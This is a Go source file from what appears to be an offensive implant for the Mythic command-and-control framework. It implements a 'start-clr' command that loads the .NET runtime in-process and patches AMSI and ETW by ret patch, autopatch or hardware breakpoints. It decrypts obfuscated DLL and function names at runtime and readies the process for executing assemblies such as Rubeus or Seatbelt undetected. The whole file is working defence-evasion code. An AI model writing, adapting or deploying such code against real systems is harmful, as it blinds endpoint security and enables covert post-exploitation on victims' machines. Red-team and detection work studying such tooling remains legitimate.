//go:build windows
// +build windows

package commands

import (
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"time"

	"fawkes/pkg/obfuscate"
	"fawkes/pkg/structs"

	"github.com/Ne0nd0g/go-clr"
)

// StartCLRCommand implements the start-clr command
type StartCLRCommand struct{}

// Name returns the command name
func (c *StartCLRCommand) Name() string {
	return "start-clr"
}

// Description returns the command description
func (c *StartCLRCommand) Description() string {
	return "Initialize the .NET CLR runtime with optional AMSI/ETW patching"
}

// StartCLRParams represents the JSON parameters from the Mythic modal
type StartCLRParams struct {
	AmsiPatch string `json:"amsi_patch"`
	EtwPatch  string `json:"etw_patch"`
	Action    string `json:"action"`
	Assembly  string `json:"assembly"`  // base64-encoded .NET assembly for execute-assembly
	Arguments string `json:"arguments"` // arguments for the assembly
}

// Execute executes the start-clr command
func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
	// Parse params early to check for execute-assembly action
	params, parseErr := unmarshalParams[StartCLRParams](task)
	if parseErr != nil {
		return *parseErr
	}

	// Handle execute-assembly action (separate flow with auto-patching)
	if params.Action == "execute-assembly" {
		return executeAssemblyAction(params.Assembly, params.Arguments)
	}

	// Use the shared assemblyMutex from inlineassembly.go for CLR state
	assemblyMutex.Lock()
	defer assemblyMutex.Unlock()

	// Ensure we're on Windows
	if runtime.GOOS != "windows" {
		return errorResult("Error: This command is only supported on Windows")
	}

	// Default patch values for backward compat
	if params.AmsiPatch == "" {
		params.AmsiPatch = "None"
	}
	if params.EtwPatch == "" {
		params.EtwPatch = "None"
	}

	var output string

	// Check if CLR is already initialized (shared state with inline-assembly)
	if clrStarted {
		output += "[*] CLR already initialized in this process\n"
	} else {
		// Redirect STDOUT/STDERR for assembly output capture
		err := clr.RedirectStdoutStderr()
		if err != nil {
			output += fmt.Sprintf("[-] Warning: Could not redirect output: %v\n", err)
		}

		// Load and initialize the CLR, storing the runtime host for inline-assembly.
		// The go-clr library's GetInterface call sometimes returns a spurious
		// "file not found" error on first invocation. Retry up to 3 times.
		var host *clr.ICORRuntimeHost
		var loadErr error
		for attempt := 1; attempt <= 3; attempt++ {
			host, loadErr = clr.LoadCLR("v4")
			if loadErr == nil {
				break
			}
			if strings.Contains(loadErr.Error(), "cannot find the file") {
				output += fmt.Sprintf("[*] CLR load attempt %d: transient error, retrying...\n", attempt)
				jitterSleep(300*time.Millisecond, 700*time.Millisecond)
				continue
			}
			break // Non-transient error, stop retrying
		}
		if loadErr != nil {
			return errorResult(output + fmt.Sprintf("Error initializing CLR: %v", loadErr))
		}
		// Store in shared state so inline-assembly can reuse this runtime host
		runtimeHost = host
		clrStarted = true
		output += "[+] CLR v4 runtime initialized successfully\n"

		// Explicitly load AMSI.dll (needed for patching regardless of method)
		err = loadAMSI()
		if err != nil {
			output += fmt.Sprintf("[-] Warning: Failed to load AMSI.dll: %v\n", err)
		} else {
			output += "[+] AMSI.dll loaded successfully\n"
		}
	}

	// Decrypt sensitive DLL/function names at runtime
	amsiDllName := obfuscate.AmsiDll()
	defer obfuscate.Zero(amsiDllName)
	amsiFunc := obfuscate.AmsiScanBuffer()
	defer obfuscate.Zero(amsiFunc)
	ntdllName := obfuscate.NtdllDll()
	defer obfuscate.Zero(ntdllName)
	etwWriteName := obfuscate.EtwEventWrite()
	defer obfuscate.Zero(etwWriteName)
	etwRegName := obfuscate.EtwEventRegister()
	defer obfuscate.Zero(etwRegName)

	// Apply AMSI patch
	switch params.AmsiPatch {
	case "Autopatch":
		output += "\n[*] Applying AMSI Autopatch...\n"
		patchOutput, err := PerformAutoPatch(amsiDllName, amsiFunc, 300)
		if err != nil {
			output += fmt.Sprintf("[-] AMSI Autopatch failed: %v\n", err)
		} else {
			amsiPatched = true
			output += patchOutput + "\n"
		}
	case "Ret Patch":
		output += "\n[*] Applying AMSI Ret Patch...\n"
		patchOutput, err := PerformRetPatch(amsiDllName, amsiFunc)
		if err != nil {
			output += fmt.Sprintf("[-] AMSI Ret Patch failed: %v\n", err)
		} else {
			amsiPatched = true
			output += patchOutput
		}
	}

	// Apply ETW patch (EtwEventWrite + EtwEventRegister)
	switch params.EtwPatch {
	case "Autopatch":
		output += "\n[*] Applying ETW Autopatch...\n"
		patchOutput, err := PerformAutoPatch(ntdllName, etwWriteName, 300)
		if err != nil {
			output += fmt.Sprintf("[-] ETW Autopatch failed: %v\n", err)
		} else {
			output += patchOutput + "\n"
		}
		output += "[*] Applying ETW Autopatch (EtwEventRegister)...\n"
		patchOutput, err = PerformAutoPatch(ntdllName, etwRegName, 300)
		if err != nil {
			output += fmt.Sprintf("[-] EtwEventRegister Autopatch failed: %v\n", err)
		} else {
			output += patchOutput + "\n"
		}
	case "Ret Patch":
		output += "\n[*] Applying ETW Ret Patch...\n"
		patchOutput, err := PerformRetPatch(ntdllName, etwWriteName)
		if err != nil {
			output += fmt.Sprintf("[-] ETW Ret Patch failed: %v\n", err)
		} else {
			output += patchOutput
		}
		output += "[*] Applying ETW Ret Patch (EtwEventRegister)...\n"
		patchOutput, err = PerformRetPatch(ntdllName, etwRegName)
		if err != nil {
			output += fmt.Sprintf("[-] EtwEventRegister Ret Patch failed: %v\n", err)
		} else {
			output += patchOutput
		}
	}

	// Apply Hardware Breakpoint patches (AMSI and/or ETW)
	needHWBP := params.AmsiPatch == "Hardware Breakpoint" || params.EtwPatch == "Hardware Breakpoint"
	if needHWBP {
		output += "\n[*] Setting up Hardware Breakpoint patches...\n"

		var amsiAddr, etwAddr uintptr

		if params.AmsiPatch == "Hardware Breakpoint" {
			addr, err := resolveFunctionAddress(amsiDllName, amsiFunc)
			if err != nil {
				output += fmt.Sprintf("[-] Failed to resolve AMSI target: %v\n", err)
			} else {
				amsiAddr = addr
				output += fmt.Sprintf("[+] AMSI target at 0x%X -> Dr0\n", addr)
			}
		}

		if params.EtwPatch == "Hardware Breakpoint" {
			addr, err := resolveFunctionAddress(ntdllName, etwWriteName)
			if err != nil {
				output += fmt.Sprintf("[-] Failed to resolve ETW target: %v\n", err)
			} else {
				etwAddr = addr
				output += fmt.Sprintf("[+] ETW target at 0x%X -> Dr1\n", addr)
			}
		}

		if amsiAddr != 0 || etwAddr != 0 {
			hwbpOutput, err := SetupHardwareBreakpoints(amsiAddr, etwAddr)
			if err != nil {
				output += fmt.Sprintf("[-] Hardware Breakpoint setup failed: %v\n", err)
			} else {
				if amsiAddr != 0 {
					amsiPatched = true
				}
				output += hwbpOutput
			}
		}
	}

	// Summary
	if params.AmsiPatch == "None" && params.EtwPatch == "None" {
		output += "\n[!] WARNING: No AMSI patch applied. Windows Defender will scan assemblies during loading."
		output += "\n[!] Known offensive tools (Seatbelt, Rubeus, SharpUp, etc.) WILL be blocked."
		output += "\n[!] Re-run start-clr with Ret Patch, Autopatch, or Hardware Breakpoint to bypass AMSI."
	} else {
		output += "\n[+] CLR initialized and patches applied. Ready for assembly execution."
	}

	return successResult(output)
}

// loadAMSI explicitly loads the AMSI DLL into the process
func loadAMSI() error {
	name := obfuscate.AmsiDll()
	defer obfuscate.Zero(name)
	dll, err := syscall.LoadDLL(name)
	if err != nil {
		return fmt.Errorf("failed to load target DLL: %w", err)
	}
	// We keep the handle - don't release it since we want it loaded in memory
	_ = dll

	return nil
}
